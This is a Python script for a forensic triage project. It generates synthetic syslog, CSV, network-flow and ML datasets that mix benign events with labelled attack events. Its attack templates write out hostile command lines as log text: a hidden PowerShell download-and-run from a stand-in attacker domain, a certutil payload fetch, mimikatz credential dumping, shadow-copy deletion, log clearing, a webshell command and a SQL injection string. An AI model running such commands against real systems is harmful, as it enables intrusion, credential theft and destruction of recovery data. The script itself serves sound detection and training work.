"""
Cyber Triage Tool - 10,000+ Forensic Evidence & ML Samples Generator
Generates realistic, standardized digital forensic evidence datasets with >= 10,000 samples each:
1. sample_evidence/enterprise_forensic_syslog_10000.log (10,000+ syslog & security events)
2. sample_evidence/cyber_security_events_10000.csv (10,000+ structured incident records)
3. sample_evidence/network_flows_10000.json (10,000+ network flow & C2 telemetry records)
4. sample_evidence/forensic_ml_dataset_10000.csv (10,000+ ML feature vectors with 80/20 split)
"""

import os
import sys
import json
import csv
import random
from datetime import datetime, timedelta
import numpy as np

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

BASE_DIR = os.path.abspath(os.path.dirname(__file__))
SAMPLE_DIR = os.path.join(BASE_DIR, "sample_evidence")
os.makedirs(SAMPLE_DIR, exist_ok=True)

# Attacker external infrastructure (Known malicious threat actors)
ATTACKER_IPS = [
    "185.220.101.5",     # LockBit / TOR Exit
    "194.26.29.112",     # LockBit C2 Gateway
    "45.142.122.8",      # Web Exploit Botnet
    "193.106.191.24",    # APT29 Stager Host
    "185.190.140.222",   # Cobalt Strike Team Server
    "194.87.68.9",       # DNS Tunnel Receiver
    "103.145.13.4",      # Metasploit Handler
    "178.62.204.101",    # SAM Exfiltration Drop Point
    "91.240.118.172",    # BlackCat / ALPHV Beacon
    "195.123.246.88"     # Conti Affiliate Relay
]

ATTACKER_DOMAINS = [
    "c2-beacon-update.darkmatter-sync.com",
    "portal-auth-session.top",
    "stage2-payload-delivery.ru",
    "dns-tunnel-exfil-data.xyz",
    "secure-banking-verify-update.cc",
    "cobaltstrike-malleable-cdn.live",
    "lockbit-ransom-negotiation.onion.to"
]

MALICIOUS_HASHES = [
    "7b2c9a6234b071e62a8291a13426e95c",
    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "8b1a9953c4611296a827abf8c47804d7",
    "d41d8cd98f00b204e9800998ecf8427e02d0fd097eed0cf42e399587f7b3a4a1",
    "b4b9b02e6f09a9bd760f388b67351e2b",
    "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae"
]

INTERNAL_HOSTS = [
    ("ADCET-DC01", "10.0.1.10"),
    ("ADCET-FILE01", "10.0.1.15"),
    ("ADCET-WEB01", "10.0.2.20"),
    ("ADCET-DB01", "10.0.2.30"),
    ("ADCET-WS-101", "10.0.5.101"),
    ("ADCET-WS-102", "10.0.5.102"),
    ("ADCET-WS-103", "10.0.5.103"),
    ("ADCET-WS-104", "10.0.5.104"),
    ("ADCET-WS-105", "10.0.5.105")
]

USERS = ["Administrator", "SYSTEM", "prapatil", "tplohar", "gsrajguru", "krshinde", "svc_backup", "guest"]

BENIGN_ACTIONS = [
    ("sshd", "Accepted publickey for user from 10.0.5.50 port 54122 ssh2"),
    ("kernel", "audit: type=USER_LOGIN msg=audit: pid=1240 uid=0 auid=1000 ses=1 res=success"),
    ("systemd", "Started Periodic Background Maintenance Tasks Service."),
    ("CRON", "(root) CMD (/usr/local/bin/backup-snapshot.sh > /dev/null 2>&1)"),
    ("nginx", 'GET /static/css/style.css HTTP/1.1" 200 4812 "https://adcet.ac.in/"'),
    ("nginx", 'GET /dashboard HTTP/1.1" 200 12450 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"'),
    ("Security-Auditing", "EventID: 4624 - An account was successfully logged on. Account Name: svc_backup Logon Type: 5"),
    ("Security-Auditing", "EventID: 4688 - A new process has been created. Creator Process: C:\\Windows\\System32\\svchost.exe New Process: taskhostw.exe"),
    ("named", "client @0x7f4b800 10.0.5.101#53211: query: internal.adcet.lan IN A + (10.0.1.10)")
]

ATTACK_SCENARIOS = [
    # 1. Brute force
    ("Security-Auditing", "EventID: 4625 - An account failed to log on. Account Name: Administrator Failure Reason: Unknown user name or bad password. Source IP: {src_ip}", "Authentication Failure", "High", "T1110"),
    ("sshd", "Failed password for invalid user root from {src_ip} port 44821 ssh2", "Authentication Failure", "High", "T1110"),
    
    # 2. Web Compromise / WebShell
    ("nginx", 'POST /uploads/b374k.php?act=cmd HTTP/1.1" 200 8192 "{src_ip}" cmd="id; whoami; uname -a" eval() backdoor executed', "WebShell Activity", "Critical", "T1505.003"),
    ("nginx", 'GET /api/query?id=1%20UNION%20SELECT%20username,password_hash%20FROM%20users-- HTTP/1.1" 200 1520 "{src_ip}" SQL Injection detected', "Web Application Compromise", "Critical", "T1190"),
    
    # 3. Credential Access / Mimikatz
    ("Sysmon", "EventID: 1 - Process Create: mimikatz.exe sekurlsa::logonpasswords lsadump::sam injected into lsass.exe process by user: SYSTEM", "Credential Dumping", "Critical", "T1003.001"),
    ("Security-Auditing", "EventID: 4672 - Special privileges assigned to new logon: SeDebugPrivilege SeTcbPrivilege enabled by Account: Administrator", "Privilege Escalation", "Medium", "T1078"),
    
    # 4. LOLBAS Execution
    ("Sysmon", "EventID: 1 - Process Create: powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA;IEX DownloadString('http://{domain}/stage2.ps1')", "Suspicious Execution / LOLBAS", "Critical", "T1059.001"),
    ("Sysmon", "EventID: 1 - Process Create: certutil.exe -urlcache -split -f http://{src_ip}/payload.exe C:\\Windows\\Temp\\update.exe", "Ingress Tool Transfer", "High", "T1105"),
    
    # 5. Persistence
    ("Sysmon", "EventID: 13 - Registry value set: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateCheck = C:\\Windows\\Temp\\update.exe", "Persistence Modification", "High", "T1547.001"),
    ("System", "EventID: 7045 - A new service was installed: DisplayName: NetworkHealthMonitor ImagePath: C:\\ProgramData\\backdoor.exe", "Service Installation", "High", "T1543.003"),
    
    # 6. C2 Beaconing
    ("Zeek-Flow", "ESTABLISHED HTTPS connection to foreign C2 IP: {src_ip}:8443 host: {domain} bytes_out: 48920 bytes_in: 1240 Cobalt Strike Malleable C2 Beacon", "Command and Control", "Critical", "T1071.001"),
    ("DNS-Server", "Suspicious DNS query: 786162636465666768697a787977.{domain} high-entropy DNS tunnel exfiltration payload detected", "DNS Tunneling Exfiltration", "High", "T1071.004"),
    
    # 7. Impact / Ransomware
    ("Sysmon", "EventID: 1 - Process Create: vssadmin.exe delete shadows /all /quiet && bcdedit.exe /set default recoveryenabled no", "Inhibit System Recovery", "Critical", "T1490"),
    ("System", "EventID: 1102 - The audit log was cleared by user: Administrator using wevtutil cl Security", "Indicator Removal on Host", "Critical", "T1070.001"),
    ("FileSystem", "Mass file encryption detected. Extension renamed to .lockbit3. Dropped ransom note: LockBit_README.txt with Bitcoin wallet: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", "Data Encrypted for Impact", "Critical", "T1486")
]


def generate_enterprise_syslog_10k(n_samples=10000):
    """Generates enterprise syslog file with >= 10,000 log lines."""
    output_path = os.path.join(SAMPLE_DIR, "enterprise_forensic_syslog_10000.log")
    start_time = datetime(2026, 8, 17, 8, 0, 0)
    lines = []

    print(f"[*] Generating {n_samples} enterprise forensic log lines...")
    attack_ratio = 0.28  # 28% security incidents, 72% normal enterprise traffic

    for i in range(n_samples):
        current_time = start_time + timedelta(seconds=i * 2 + random.randint(0, 3))
        ts_syslog = current_time.strftime("%b %d %H:%M:%S")
        ts_iso = current_time.strftime("%Y-%m-%d %H:%M:%S")
        host_name, host_ip = random.choice(INTERNAL_HOSTS)

        is_attack = (random.random() < attack_ratio)

        if is_attack:
            scenario = random.choice(ATTACK_SCENARIOS)
            app_name = scenario[0]
            template = scenario[1]
            src_ip = random.choice(ATTACKER_IPS)
            domain = random.choice(ATTACKER_DOMAINS)
            msg = template.format(src_ip=src_ip, domain=domain)
            line = f"{ts_syslog} {host_name} {app_name}[{random.randint(1000, 9999)}]: {msg}"
        else:
            app_name, msg = random.choice(BENIGN_ACTIONS)
            line = f"{ts_syslog} {host_name} {app_name}[{random.randint(1000, 9999)}]: {msg}"

        lines.append(line)

    with open(output_path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")

    print(f"[+] Saved: {output_path} ({len(lines)} lines, {os.path.getsize(output_path):,} bytes)")
    return output_path, len(lines)


def generate_security_events_csv_10k(n_samples=10000):
    """Generates structured CSV with >= 10,000 security event records."""
    output_path = os.path.join(SAMPLE_DIR, "cyber_security_events_10000.csv")
    start_time = datetime(2026, 8, 17, 8, 0, 0)

    headers = [
        "event_id", "timestamp", "host", "source_ip", "dest_ip", "dest_port",
        "protocol", "user", "action", "severity", "mitre_technique", "threat_vector", "description"
    ]

    print(f"[*] Generating {n_samples} structured forensic CSV events...")
    rows = []

    for i in range(1, n_samples + 1):
        current_time = start_time + timedelta(seconds=i * 2 + random.randint(0, 2))
        ts_str = current_time.strftime("%Y-%m-%d %H:%M:%S")
        host_name, host_ip = random.choice(INTERNAL_HOSTS)
        user = random.choice(USERS)

        is_attack = (random.random() < 0.30)

        if is_attack:
            scenario = random.choice(ATTACK_SCENARIOS)
            app_name, template, action, severity, mitre = scenario
            src_ip = random.choice(ATTACKER_IPS)
            domain = random.choice(ATTACKER_DOMAINS)
            dest_port = random.choice([80, 443, 8443, 4444, 22, 3389, 53])
            proto = "TCP" if dest_port != 53 else "UDP"
            desc = template.format(src_ip=src_ip, domain=domain)
            vector = "Ransomware" if "shadow" in desc or "lockbit" in desc else (
                "Credential Theft" if "mimikatz" in desc else (
                    "Web Compromise" if "nginx" in desc else "APT & C2"
                )
            )
            rows.append([
                i, ts_str, host_name, src_ip, host_ip, dest_port,
                proto, user, action, severity, mitre, vector, desc
            ])
        else:
            app_name, desc = random.choice(BENIGN_ACTIONS)
            src_ip = f"10.0.5.{random.randint(10, 250)}"
            dest_port = random.choice([80, 443, 53, 445, 135])
            proto = "TCP" if dest_port != 53 else "UDP"
            rows.append([
                i, ts_str, host_name, src_ip, host_ip, dest_port,
                proto, user, "Routine Activity", "Low", "N/A", "Benign", desc
            ])

    with open(output_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(headers)
        writer.writerows(rows)

    print(f"[+] Saved: {output_path} ({len(rows)} records, {os.path.getsize(output_path):,} bytes)")
    return output_path, len(rows)


def generate_network_flows_json_10k(n_samples=10000):
    """Generates JSON network flows with >= 10,000 telemetry flow items."""
    output_path = os.path.join(SAMPLE_DIR, "network_flows_10000.json")
    start_time = datetime(2026, 8, 17, 8, 0, 0)

    print(f"[*] Generating {n_samples} network telemetry flows in JSON...")
    flows = []

    for i in range(1, n_samples + 1):
        current_time = start_time + timedelta(seconds=i + random.randint(0, 3))
        ts_str = current_time.strftime("%Y-%m-%d %H:%M:%S")
        host_name, host_ip = random.choice(INTERNAL_HOSTS)

        is_c2 = (random.random() < 0.20)

        if is_c2:
            dst_ip = random.choice(ATTACKER_IPS)
            dst_port = random.choice([8443, 4444, 8080, 53, 9001])
            domain = random.choice(ATTACKER_DOMAINS)
            proto = "TCP" if dst_port != 53 else "UDP"
            flow = {
                "flow_id": i,
                "timestamp": ts_str,
                "src_ip": host_ip,
                "dst_ip": dst_ip,
                "src_port": random.randint(49152, 65535),
                "dst_port": dst_port,
                "protocol": proto,
                "bytes_out": random.randint(12000, 850000),
                "bytes_in": random.randint(500, 15000),
                "packets": random.randint(25, 450),
                "flags": "SYN,ACK,PSH",
                "dns_query": domain if dst_port == 53 or random.random() < 0.5 else None,
                "alert": "Suspicious Outbound C2 Beaconing / High Volume Exfiltration",
                "severity": "Critical" if dst_port in [4444, 8443] else "High"
            }
        else:
            dst_ip = f"172.217.{random.randint(1, 20)}.{random.randint(1, 250)}"
            dst_port = random.choice([80, 443, 53])
            proto = "TCP" if dst_port != 53 else "UDP"
            flow = {
                "flow_id": i,
                "timestamp": ts_str,
                "src_ip": host_ip,
                "dst_ip": dst_ip,
                "src_port": random.randint(49152, 65535),
                "dst_port": dst_port,
                "protocol": proto,
                "bytes_out": random.randint(200, 4500),
                "bytes_in": random.randint(1000, 25000),
                "packets": random.randint(5, 40),
                "flags": "SYN,ACK",
                "dns_query": "www.google.com" if dst_port == 53 else None,
                "alert": None,
                "severity": "Low"
            }
        flows.append(flow)

    payload = {
        "dataset_name": "ADCET Enterprise Network Telemetry 10K",
        "generated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "total_flows": len(flows),
        "flows": flows
    }

    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(payload, f, indent=2)

    print(f"[+] Saved: {output_path} ({len(flows)} JSON flow items, {os.path.getsize(output_path):,} bytes)")
    return output_path, len(flows)


def generate_ml_features_csv_10k(n_samples=10000):
    """Generates persisted ML dataset of >= 10,000 feature vectors with 80/20 train-test split."""
    output_path = os.path.join(SAMPLE_DIR, "forensic_ml_dataset_10000.csv")
    print(f"[*] Generating {n_samples} machine learning feature vectors...")

    rng = np.random.default_rng(42)
    samples_per_class = n_samples // 5

    labels_map = {
        0: "Benign / Normal Activity",
        1: "Ransomware / Extortion",
        2: "APT & C2 Communication",
        3: "Credential Theft & Access",
        4: "Web Application Compromise"
    }

    headers = [
        "sample_id", "total_iocs", "public_ips", "lolbas_cmds", "yara_hits",
        "shadow_copies_wiped", "mimikatz_hits", "webshell_hits", "entropy",
        "mitre_count", "class_id", "class_name", "split_set"
    ]

    all_rows = []
    current_id = 1

    for class_id in range(5):
        n = samples_per_class
        for _ in range(n):
            if class_id == 0:  # Benign
                total_iocs = int(rng.integers(0, 3))
                public_ips = int(rng.integers(0, 2))
                lolbas_cmds = 0
                yara_hits = 0
                shadow_wiped = 0
                mimikatz = 0
                webshell = 0
                entropy = round(float(rng.uniform(3.5, 5.2)), 2)
                mitre_count = 0
            elif class_id == 1:  # Ransomware
                total_iocs = int(rng.integers(6, 18))
                public_ips = int(rng.integers(2, 6))
                lolbas_cmds = int(rng.integers(2, 5))
                yara_hits = int(rng.integers(2, 5))
                shadow_wiped = int(rng.choice([0, 1], p=[0.2, 0.8]))
                mimikatz = 0
                webshell = 0
                entropy = round(float(rng.uniform(7.1, 7.95)), 2)
                mitre_count = int(rng.integers(4, 9))
            elif class_id == 2:  # APT & C2
                total_iocs = int(rng.integers(5, 16))
                public_ips = int(rng.integers(3, 8))
                lolbas_cmds = int(rng.integers(1, 4))
                yara_hits = int(rng.integers(1, 4))
                shadow_wiped = 0
                mimikatz = 0
                webshell = 0
                entropy = round(float(rng.uniform(6.1, 7.6)), 2)
                mitre_count = int(rng.integers(3, 8))
            elif class_id == 3:  # Credential Access
                total_iocs = int(rng.integers(3, 12))
                public_ips = int(rng.integers(1, 4))
                lolbas_cmds = int(rng.integers(2, 5))
                yara_hits = int(rng.integers(1, 4))
                shadow_wiped = 0
                mimikatz = int(rng.choice([0, 1], p=[0.15, 0.85]))
                webshell = 0
                entropy = round(float(rng.uniform(5.8, 7.2)), 2)
                mitre_count = int(rng.integers(2, 7))
            else:  # Web Compromise
                total_iocs = int(rng.integers(4, 14))
                public_ips = int(rng.integers(2, 6))
                lolbas_cmds = int(rng.integers(1, 3))
                yara_hits = int(rng.integers(1, 4))
                shadow_wiped = 0
                mimikatz = 0
                webshell = int(rng.choice([0, 1], p=[0.15, 0.85]))
                entropy = round(float(rng.uniform(5.4, 7.1)), 2)
                mitre_count = int(rng.integers(3, 7))

            split_set = "TRAIN" if (rng.random() < 0.80) else "TEST"

            all_rows.append([
                current_id, total_iocs, public_ips, lolbas_cmds, yara_hits,
                shadow_wiped, mimikatz, webshell, entropy, mitre_count,
                class_id, labels_map[class_id], split_set
            ])
            current_id += 1

    # Shuffle to mix classes
    rng.shuffle(all_rows)

    with open(output_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(headers)
        writer.writerows(all_rows)

    print(f"[+] Saved: {output_path} ({len(all_rows)} vectors, {os.path.getsize(output_path):,} bytes)")
    return output_path, len(all_rows)


def main():
    print("=" * 70)
    print("🚀 GENERATING 10,000+ SAMPLES FOR CYBER TRIAGE TOOL")
    print("   Repository: https://github.com/Gauravrajguru132/Cyber-Triage-Tool")
    print("=" * 70)

    f1, n1 = generate_enterprise_syslog_10k(10000)
    f2, n2 = generate_security_events_csv_10k(10000)
    f3, n3 = generate_network_flows_json_10k(10000)
    f4, n4 = generate_ml_features_csv_10k(10000)

    print("\n" + "=" * 70)
    print("🎉 ALL 10,000+ SAMPLE DATASETS SUCCESSFULLY CREATED!")
    print(f"1. Enterprise Syslog Log: {n1:,} lines -> {f1}")
    print(f"2. Security Events CSV:   {n2:,} records -> {f2}")
    print(f"3. Network Flows JSON:    {n3:,} flows -> {f3}")
    print(f"4. Forensic ML Dataset:   {n4:,} vectors -> {f4}")
    print(f"Total Forensic Samples:   {n1 + n2 + n3 + n4:,} items across formats!")
    print("=" * 70)


if __name__ == "__main__":
    main()
